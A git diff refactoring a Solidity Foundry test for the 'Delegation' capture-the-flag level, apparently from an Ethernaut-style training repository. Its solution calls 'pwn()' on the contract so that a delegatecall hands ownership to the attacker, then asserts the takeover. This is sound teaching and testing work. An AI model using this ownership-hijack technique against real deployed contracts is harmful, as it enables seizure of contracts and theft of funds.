@@ -1,42 +1,42 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "tests/Test.sol";
-import "../../src/Delegation/Level.sol";
-import "forge-std/console.sol";
+import {LevelFactory} from "../utils/LevelFactory.sol";
+import {Delegation, Delegate} from "../../src/Delegation/Level.sol";
 
 interface IDelegation {
-    function owner() external returns(address);
+  function owner() external returns(address);
 }
 
-contract DelegationTest is Test {
-    IDelegation delegation;
+contract DelegationTest is LevelFactory {
+  IDelegation delegation;
 
-    address deployer = address(100);
-    address attacker = address(101);
+  function setUp() public {
+    vm.prank(deployer); // deploy the contract as deployer
+    Delegate delegate = new Delegate(deployer);
+    delegation = IDelegation(address(new Delegation(address(delegate))));
+  }
 
-    function setUp() public {
-        console.log(deployer, attacker);
-        vm.prank(deployer); // deploy the contract as deployer
-        Delegate delegate = new Delegate(deployer);
-        delegation = IDelegation(address(new Delegation(address(delegate))));
-    }
+  function testAttack() public {
+    submitLevel("Delegation");
+  }
 
-    function testAttack() public {
-        /* Setup stuff, no need to touch */
-        vm.startPrank(attacker);
-        vm.deal(attacker, 5 ether);
+  function _performTest() internal override {
+    /* Write your code here */
+    (bool worked,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
+    assert(worked);
+    /* Write your code here */
+  }
 
-        /* Write your code here */
-        console.log(delegation.owner());
-        (bool worked,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
-        assert(worked);
-        console.log(delegation.owner());
-        /* Write your code here */ 
+  function _setupTest() internal override {
+    super._setupTest();
+  }
 
-        /* Validating the test */
-        assertEq(delegation.owner(), attacker);
-    }
+  function _checkTest() internal override returns (bool) {
+    /* Validating the test */
+    assertEq(delegation.owner(), attacker);
 
+    return (delegation.owner() == attacker);
+  }
 }
 
